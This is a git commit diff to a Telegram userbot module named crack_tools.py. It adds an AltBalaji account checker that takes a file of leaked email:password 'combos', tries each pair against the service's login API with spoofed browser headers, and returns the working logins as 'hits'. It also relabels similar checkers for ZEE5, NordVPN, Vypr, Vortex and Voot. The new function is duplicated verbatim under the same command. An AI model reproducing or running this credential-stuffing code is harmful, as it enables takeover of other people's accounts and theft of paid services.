a2c70908dfc4b45a3f3dc82e23e27a05eb900e80
Inuka ASiTH <inukaasith7@gmail.com>
2021-01-09 14:15:14 +0530

    Update crack_tools.py

--- fridaybot/modules/crack_tools.py
+++ fridaybot/modules/crack_tools.py
@@ -38,6 +38,21 @@ face = {
 }
 
 
+pq={
+ "Accept":"application/json, text/plain",
+ "Accept-Encoding":"gzip, deflate, br",
+ "Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8,ta;q=0.7",
+ "Connection":"keep-alive",
+ "Host":"api.cloud.altbalaji.com",
+ "Origin":"https://www.altbalaji.com",
+ "Referer":"https://www.altbalaji.com/",
+ "Sec-Fetch-Dest":"empty",
+ "Sec-Fetch-Mode":"cors",
+ "Sec-Fetch-Site":"same-site",
+ "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
+}
+
+
 @friday.on(friday_on_cmd(pattern="cz5$"))
 async def zee5(event):
     await event.edit('`Checking Your Combos. This May Take Time Depending On No of Combos.`')
@@ -71,7 +86,7 @@ async def zee5(event):
         return
     with open("hits.txt", "w") as hitfile:
         for s in hits_dict:
-            hitfile.write(s + ' | @Infinity_Bots')
+            hitfile.write(s + ' | @FridayOT\n')
     await borg.send_file(
         event.chat_id, "hits.txt", caption=f"**!ZEE5 HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
     )
@@ -115,7 +130,7 @@ async def vypr(event):
         return
     with open("hits.txt", "w") as hitfile:
         for s in hits_dict:
-            hitfile.write(s + ' | @Infinity_Bots')
+            hitfile.write(s + ' | @VirtualUserbot\n')
     await borg.send_file(
         event.chat_id, "hits.txt", caption=f"**!NORD HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
     )
@@ -159,7 +174,7 @@ async def vortex(event):
         return
     with open("hits.txt", "w") as hitfile:
         for s in hits_dict:
-            hitfile.write(s + ' | @Infinity_Bots')
+            hitfile.write(s + ' | @FridayOT\n')
     await borg.send_file(
         event.chat_id, "hits.txt", caption=f"**!VORTEX HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
     )
@@ -210,7 +225,7 @@ async def vortex(event):
         return
     with open("hits.txt", "w") as hitfile:
         for s in hits_dict:
-            hitfile.write(s + ' | @Infinity_Bots')
+            hitfile.write(s + ' | @VirtualUserbot\n')
     await borg.send_file(
         event.chat_id, "hits.txt", caption=f"**!VYPR HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
     )
@@ -253,7 +268,7 @@ async def _(event):
       await event.edit("Check Failed. Either Your File Has All Bad Proxies Or Your Proxy File Is Invalid.")
     elif Counter>=1:
       file1 = open("goood.txt", "a")
-      file1.write("\nCHECKED BY VirtualUserbot. GET YOUR OWN VirtualUserbot FROM @Infinity_Bots. ") 
+      file1.write("\nCHECKED BY VirtualUserbot. GET YOUR OWN FRIDAY FROM @VirtualUserbot. ") 
       file1.close() 
       await borg.send_file(event.chat_id, "goood.txt", caption=f"**PROXIES CHECKED**\n**GOOD PROXIES: ** {Counter}\n\n**CHECKED BY FRIDAY. GET YOUR OWN FRIDAY FROM @FRIDAYCHAT.**")
       os.remove(escobar)
@@ -305,7 +320,7 @@ async def voot(event):
                 return
               with open("hits.txt", "w") as hitfile:
                 for s in good_dict:
-                  hitfile.write(s + ' | @FridayOT')
+                  hitfile.write(s + ' | @VirtualUserbot')
                 await borg.send_file(event.chat_id, "hits.txt", caption=f"**!VOOT HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bady}`")
                 os.remove("hits.txt")
                 return
@@ -315,13 +330,96 @@ async def voot(event):
         return
     with open("hits.txt", "w") as hitfile:
         for s in good_dict:
-            hitfile.write(s + ' | @Infinity_Bots')
+            hitfile.write(s + ' | @VirtualUserbot\n')
     await borg.send_file(
         event.chat_id, "hits.txt", caption=f"**!VOOT HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bady}`"
     )
     os.remove("hits.txt")
 
 
+
+@friday.on(friday_on_cmd(pattern="cab$"))
+async def altbalaji(event):
+    await event.edit('`Checking Your Combos. This May Take Time Depending On No of Combos.`')
+    stark_dict = []
+    hits_dict = []
+    hits = 0
+    bads = 0
+    lol = await event.get_reply_message()
+    starky = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
+    
+    with open(starky) as f:
+        stark_dict = f.read().splitlines()
+    os.remove(starky)
+    if len(stark_dict) > 50:
+        await event.edit('`Woah, Thats A Lot Of Combos. Keep 50 As Limit`')
+        return
+    for i in stark_dict:
+        starkm = i.split(":")
+        email = starkm[0]
+        password = starkm[1]
+        plaq = {"username":email,"password":password}
+        try:
+            meke = requests.post("https://api.cloud.altbalaji.com/accounts/login?domain=IN",json=plaq, headers=pq).json()
+        except:
+            meke = None
+        if meke.get("session_token"):
+            hits += 1
+            hits_dict.append(f"{email}:{password}")
+        else:
+            bads += 1
+    if len(hits_dict) == 0:
+        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
+        return
+    with open("hits.txt", "w") as hitfile:
+        for s in hits_dict:
+            hitfile.write(s + ' | @VirtualUserbot\n')
+    await borg.send_file(
+        event.chat_id, "hits.txt", caption=f"**!ALTBALAJI HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
+    )
+    os.remove("hits.txt")
+
+
+@friday.on(friday_on_cmd(pattern="cab$"))
+async def altbalaji(event):
+    await event.edit('`Checking Your Combos. This May Take Time Depending On No of Combos.`')
+    normal_list = []
+    hits_dict = []
+    hits = 0
+    bads = 0
+    lol = await event.get_reply_message()
+    nub = await borg.download_media(lol.media, Config.TMP_DOWNLOAD_DIRECTORY)
+    
+    with open(nub) as f:
+        normal_list = f.read().splitlines()
+    os.remove(nub)
+    if len(normal_list) > 50:
+        await event.edit('`Woah, Thats A Lot Of Combos. Keep 50 As Limit`')
+        return
+    for i in normal_list:
+        Hitler = i.split(":")
+        email = Hitler[0]
+        password = Hitler[1]
+        plaq = {"username":email,"password":password}
+        try:
+            meke = requests.post("https://api.cloud.altbalaji.com/accounts/login?domain=IN",json=plaq, headers=pq).json()
+        except:
+            meke = None
+        if meke.get("session_token"):
+            hits += 1
+            hits_dict.append(f"{email}:{password}")
+        else:
+            bads += 1
+    if len(hits_dict) == 0:
+        await event.edit("**0 Hits. Probably, You Should Find Better Combos. LoL**")
+        return
+    with open("hits.txt", "w") as hitfile:
+        for s in hits_dict:
+            hitfile.write(s + ' | @FridayOT\n')
+    await borg.send_file(
+        event.chat_id, "hits.txt", caption=f"**!ALTBALAJI HITS!** \n**HITS :** `{hits}` \n**BAD :** `{bads}`"
+    )
+    os.remove("hits.txt")
 
 CMD_HELP.update(
     {
@@ -332,6 +430,8 @@ CMD_HELP.update(
 \n**Usage :** Checks for VYPR accounts from combo.\
 \n\n**Syntax : **`.cvt <reply to combo>`\
 \n**Usage :** Checks for Voot accounts from combo.\
+\n\n**Syntax : **`.cab <reply to combo>`\
+\n**Usage :** Checks for Altbalaji accounts from combo.\
 \n\n**Syntax : **`.cvx <reply to combo>`\
 \n**Usage :** Checks for Vortex accounts from combo.\
 \n\n**Syntax : **`.cz5 <reply to combo>`\
